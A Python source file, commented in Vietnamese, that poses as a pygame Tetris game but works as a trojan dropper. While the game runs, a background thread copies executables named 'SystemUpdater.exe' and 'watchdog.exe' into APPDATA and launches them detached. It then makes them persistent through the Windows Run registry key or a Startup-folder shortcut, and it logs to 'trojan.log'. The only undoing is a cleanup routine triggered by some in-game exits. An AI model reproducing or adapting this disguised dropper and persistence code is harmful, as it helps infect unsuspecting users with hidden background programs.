import os
import sys
import subprocess
import threading
import tkinter as tk
import tkinter.messagebox as messagebox
import winreg
import shutil
import logging
import psutil
import time
import pygame
from game import Game
from colors import Colors

# Kiểm tra và giới hạn một instance
pid_file = os.path.join(os.getenv('APPDATA'), 'calculator.pid')
try:
    if os.path.exists(pid_file):
        try:
            with open(pid_file, 'r') as f:
                pid = int(f.read().strip())
            if psutil.pid_exists(pid):
                subprocess.Popen([sys.executable, __file__, "already_running"], shell=True)
                sys.exit(0)
            else:
                os.remove(pid_file)
        except (ValueError, OSError) as e:
            logging.error(f"Lỗi đọc file PID: {e}, xóa file và tiếp tục.")
            if os.path.exists(pid_file):
                os.remove(pid_file)

    with open(pid_file, 'w') as f:
        f.write(str(os.getpid()))
except PermissionError as e:
    print(f"Lỗi quyền truy cập khi ghi file PID: {e}. Chạy chương trình với quyền Admin.")
    sys.exit(1)
except Exception as e:
    print(f"Lỗi khi kiểm tra PID: {e}")
    sys.exit(1)

try:
    # Cấu hình logging
    log_path = os.path.join(os.getenv('APPDATA'), 'trojan.log')
    try:
        logging.basicConfig(filename=log_path, level=logging.DEBUG, format='%(asctime)s,%(msecs)d - %(message)s', encoding='utf-8')
    except PermissionError as e:
        print(f"Lỗi quyền truy cập khi tạo log: {e}. Chạy với quyền Admin.")
        sys.exit(1)

    # Constants
    APP_NAME = "SystemUpdater"
    BOT_NAME = "SystemUpdater.exe"
    BOT_PATH = os.path.join(os.getenv('APPDATA'), BOT_NAME)
    WATCHDOG_NAME = "watchdog.exe"
    WATCHDOG_PATH = os.path.join(os.getenv('APPDATA'), WATCHDOG_NAME)
    AUTO_CLEANUP = False  # Có thể bật lên nếu muốn tự động cleanup

    def stop_related_processes():
        """Dừng tất cả các tiến trình liên quan"""
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] in [BOT_NAME, WATCHDOG_NAME]:
                try:
                    pid = proc.info['pid']
                    proc.kill()
                    logging.info(f"Đã dừng {proc.info['name']} với PID: {pid}")
                    time.sleep(1)
                except Exception as e:
                    logging.error(f"Lỗi khi dừng {proc.info['name']} với PID {pid}: {e}")

    # Copy file bot và watchdog, chạy lần đầu
    def drop_bot():
        try:
            current_dir = os.path.dirname(os.path.abspath(__file__))
            
            source_bot = os.path.join(current_dir, BOT_NAME)
            if not os.path.exists(BOT_PATH) and os.path.isfile(source_bot):
                shutil.copy(source_bot, BOT_PATH)
                logging.info(f"Đã copy {source_bot} sang {BOT_PATH}")
            elif not os.path.isfile(source_bot):
                logging.error(f"File nguồn {source_bot} không tồn tại!")
                return
            else:
                logging.info(f"File {BOT_PATH} đã tồn tại, bỏ qua bước copy.")
            
            source_watchdog = os.path.join(current_dir, WATCHDOG_NAME)
            if not os.path.exists(WATCHDOG_PATH) and os.path.isfile(source_watchdog):
                shutil.copy(source_watchdog, WATCHDOG_PATH)
                logging.info(f"Đã copy {source_watchdog} sang {WATCHDOG_PATH}")
            elif not os.path.isfile(source_watchdog):
                logging.error(f"File nguồn {source_watchdog} không tồn tại!")
                return
            else:
                logging.info(f"File {WATCHDOG_PATH} đã tồn tại, bỏ qua bước copy.")
            
            stop_related_processes()

            if os.path.exists(BOT_PATH):
                subprocess.Popen([BOT_PATH], creationflags=subprocess.DETACHED_PROCESS)
                logging.info(f"Bot đã được chạy từ {BOT_PATH}.")
            else:
                logging.error(f"Không tìm thấy {BOT_PATH} để khởi động!")
            
            if os.path.exists(WATCHDOG_PATH):
                subprocess.Popen([WATCHDOG_PATH], creationflags=subprocess.DETACHED_PROCESS)
                logging.info(f"Watchdog đã được chạy từ {WATCHDOG_PATH}.")
            else:
                logging.error(f"Không tìm thấy {WATCHDOG_PATH} để khởi động!")
        
        except PermissionError as e:
            logging.error(f"Lỗi quyền truy cập trong drop_bot: {e}")
            return
        except Exception as e:
            logging.error(f"Lỗi trong drop_bot: {e}")
            return

        setup_persistence()

    # Cơ chế duy trì (Persistence)
    def setup_persistence():
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_QUERY_VALUE) as reg_key:
                existing_path, _ = winreg.QueryValueEx(reg_key, APP_NAME)
                if existing_path == WATCHDOG_PATH:
                    logging.info("Watchdog đã được thêm vào Registry từ trước.")
                    return
        except FileNotFoundError:
            pass
        except Exception as e:
            logging.warning(f"Lỗi kiểm tra Registry: {e}")
        
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, APP_NAME, 0, winreg.REG_SZ, WATCHDOG_PATH)
            logging.info("Đã thêm watchdog vào Registry thành công.")
            return
        except Exception as e:
            logging.warning(f"Không thể thêm vào Registry (có thể thiếu quyền): {e}")

        startup_path = os.path.join(os.getenv('APPDATA'), r"Microsoft\Windows\Start Menu\Programs\Startup", f"{APP_NAME}.lnk")
        try:
            if not os.path.exists(startup_path):
                import winshell
                from win32com.client import Dispatch
                shell = Dispatch('WScript.Shell')
                shortcut = shell.CreateShortCut(startup_path)
                shortcut.Targetpath = WATCHDOG_PATH
                shortcut.save()
                logging.info(f"Đã thêm watchdog vào Startup folder: {startup_path}")
            else:
                logging.info("Watchdog đã có trong Startup folder từ trước.")
        except Exception as e:
            logging.error(f"Không thể thêm vào Startup folder: {e}")

    # Hàm tự hủy
    def cleanup():
        stop_file = os.path.join(os.getenv('APPDATA'), "stop_bot.txt")
        try:
            with open(stop_file, 'w') as f:
                f.write("stop")
            logging.info("Đã tạo file tín hiệu dừng.")
        except Exception as e:
            logging.error(f"Lỗi khi tạo file tín hiệu dừng: {e}")

        max_wait_time = 10
        start_time = time.time()
        while time.time() - start_time < max_wait_time:
            running = False
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] in [BOT_NAME, WATCHDOG_NAME]:
                    proc.kill()
                    logging.info(f"Đã dừng {proc.info['name']} với PID: {proc.info['pid']}")
                    running = True
            if not running:
                break
            time.sleep(1)

        try:
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.DeleteValue(reg_key, APP_NAME)
            logging.info("Đã xóa mục Registry.")
        except Exception as e:
            logging.warning(f"Không thể xóa mục Registry: {e}")

        for log in [log_path, os.path.join(os.getenv('APPDATA'), "system_log.txt"), os.path.join(os.getenv('APPDATA'), "watchdog_log.txt")]:
            if os.path.exists(log):
                try:
                    os.remove(log)
                    logging.info(f"Đã xóa file log: {log}")
                except Exception as e:
                    logging.error(f"Không thể xóa file log {log}: {e}")

        if os.path.exists(stop_file):
            try:
                os.remove(stop_file)
                logging.info("Đã xóa file tín hiệu dừng.")
            except Exception as e:
                logging.error(f"Lỗi khi xóa file tín hiệu dừng: {e}")

    def run_tetris():
        pygame.init()
        title_font = pygame.font.Font(None, 40)
        score_surface = title_font.render("Score", True, Colors.white)
        next_surface = title_font.render("Next", True, Colors.white)
        game_over_surface = title_font.render("GAME OVER", True, Colors.white)
        pause_surface = title_font.render("Pause", True, Colors.white)
        exit_surface = title_font.render("Exit", True, Colors.white)
        retry_surface = title_font.render("Retry", True, Colors.white)

        # Font lớn hơn cho nút Retry và Exit khi game over
        button_font = pygame.font.Font(None, 60)
        retry_surface_large = button_font.render("Retry", True, Colors.white)
        exit_surface_large = button_font.render("Exit", True, Colors.white)

        score_rect = pygame.Rect(320, 55, 170, 60)
        next_rect = pygame.Rect(320, 215, 170, 180)
        pause_rect = pygame.Rect(320, 400, 170, 60)  # Nút Pause
        exit_rect = pygame.Rect(320, 480, 170, 60)   # Nút Exit (khi chơi)
        retry_rect = pygame.Rect(150, 350, 200, 80)  # Nút Retry (giữa màn hình)
        exit_game_over_rect = pygame.Rect(150, 450, 200, 80)  # Nút Exit (giữa màn hình)

        screen = pygame.display.set_mode((500, 620))
        pygame.display.set_caption("Python Tetris")

        clock = pygame.time.Clock()

        game = Game()
        is_paused = False  # Biến để theo dõi trạng thái tạm dừng

        # Biến trạng thái để theo dõi hiệu ứng click
        pause_pressed = False
        exit_pressed = False
        retry_pressed = False
        exit_game_over_pressed = False

        GAME_UPDATE = pygame.USEREVENT
        pygame.time.set_timer(GAME_UPDATE, 200)

        def confirm_exit():
            root = tk.Tk()
            root.withdraw()  # Ẩn cửa sổ Tkinter
            if messagebox.askyesno("Xác nhận", "Bạn có chắc muốn thoát?"):
                cleanup()
                pygame.quit()
                sys.exit()
            root.destroy()

        while True:
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    if AUTO_CLEANUP and messagebox.askyesno("Xác nhận", "Bạn có chắc muốn thoát?"):
                        cleanup()
                        pygame.quit()
                        sys.exit()
                    else:
                        pygame.quit()
                        sys.exit()
                if event.type == pygame.MOUSEBUTTONDOWN:
                    if not game.game_over and exit_rect.collidepoint(event.pos):
                        exit_pressed = True
                    if not game.game_over and pause_rect.collidepoint(event.pos):
                        pause_pressed = True
                    if game.game_over and retry_rect.collidepoint(event.pos):
                        retry_pressed = True
                    if game.game_over and exit_game_over_rect.collidepoint(event.pos):
                        exit_game_over_pressed = True
                if event.type == pygame.MOUSEBUTTONUP:
                    if not game.game_over and exit_rect.collidepoint(event.pos) and exit_pressed:
                        if messagebox.askyesno("Xác nhận", "Bạn có chắc muốn thoát?"):
                            cleanup()
                            pygame.quit()
                            sys.exit()
                    if not game.game_over and pause_rect.collidepoint(event.pos) and pause_pressed:
                        is_paused = not is_paused
                    if game.game_over and retry_rect.collidepoint(event.pos) and retry_pressed:
                        game.reset()
                    if game.game_over and exit_game_over_rect.collidepoint(event.pos) and exit_game_over_pressed:
                        if messagebox.askyesno("Xác nhận", "Bạn có chắc muốn thoát?"):
                            cleanup()
                            pygame.quit()
                            sys.exit()
                    pause_pressed = False
                    exit_pressed = False
                    retry_pressed = False
                    exit_game_over_pressed = False
                if event.type == pygame.KEYDOWN:
                    if game.game_over == True:
                        if event.key == pygame.K_r:
                            game.reset()
                        if event.key == pygame.K_e:
                            confirm_exit()
                    if event.key == pygame.K_LEFT and game.game_over == False and not is_paused:
                        game.move_left()
                    if event.key == pygame.K_RIGHT and game.game_over == False and not is_paused:
                        game.move_right()
                    if event.key == pygame.K_DOWN and game.game_over == False and not is_paused:
                        game.move_down()
                        game.update_score(0, 1)
                    if event.key == pygame.K_UP and game.game_over == False and not is_paused:
                        game.rotate()
                    if event.key == pygame.K_a and game.game_over == False and not is_paused:
                        game.move_left()
                    if event.key == pygame.K_d and game.game_over == False and not is_paused:
                        game.move_right()
                    if event.key == pygame.K_s and game.game_over == False and not is_paused:
                        game.move_down()
                        game.update_score(0, 1)
                    if event.key == pygame.K_w and game.game_over == False and not is_paused:
                        game.rotate()
                    if event.key == pygame.K_SPACE and game.game_over == False and not is_paused:
                        game.rotate()
                if event.type == GAME_UPDATE and game.game_over == False and not is_paused:
                    game.move_down()

            # Drawing
            score_value_surface = title_font.render(str(game.score), True, Colors.white)

            screen.fill(Colors.dark_blue)
            screen.blit(score_surface, (365, 20, 50, 50))
            screen.blit(next_surface, (375, 180, 50, 50))
            game.draw(screen)

            if game.game_over == True:
                overlay = pygame.Surface((500, 620))
                overlay.set_alpha(200)
                overlay.fill((0, 0, 0))
                screen.blit(overlay, (0, 0))
                game_over_surface_large = button_font.render("GAME OVER", True, Colors.red)
                screen.blit(game_over_surface_large, (150, 250))
                pygame.draw.rect(screen, Colors.dark_grey if retry_pressed else Colors.red, retry_rect, 0, 10)
                screen.blit(retry_surface_large, retry_surface_large.get_rect(centerx=retry_rect.centerx, centery=retry_rect.centery))
                pygame.draw.rect(screen, Colors.dark_grey if exit_game_over_pressed else Colors.red, exit_game_over_rect, 0, 10)
                screen.blit(exit_surface_large, exit_surface_large.get_rect(centerx=exit_game_over_rect.centerx, centery=exit_game_over_rect.centery))
            else:
                pygame.draw.rect(screen, Colors.light_blue, score_rect, 0, 10)
                screen.blit(score_value_surface, score_value_surface.get_rect(centerx=score_rect.centerx, 
                    centery=score_rect.centery))
                pygame.draw.rect(screen, Colors.light_blue, next_rect, 0, 10)
                pygame.draw.rect(screen, Colors.dark_grey if pause_pressed else Colors.light_blue, pause_rect, 0, 10)
                screen.blit(pause_surface, pause_surface.get_rect(centerx=pause_rect.centerx, 
                    centery=pause_rect.centery))
                pygame.draw.rect(screen, Colors.dark_grey if exit_pressed else Colors.light_blue, exit_rect, 0, 10)
                screen.blit(exit_surface, exit_surface.get_rect(centerx=exit_rect.centerx, 
                    centery=exit_rect.centery))

            pygame.display.update()
            clock.tick(60)

    if __name__ == "__main__":
        threading.Thread(target=drop_bot, daemon=True).start()
        run_tetris()
finally:
    if os.path.exists(pid_file):
        try:
            os.remove(pid_file)
        except Exception as e:
            logging.error(f"Lỗi khi xóa file PID: {e}")
            print(f"Lỗi khi xóa file PID: {e}")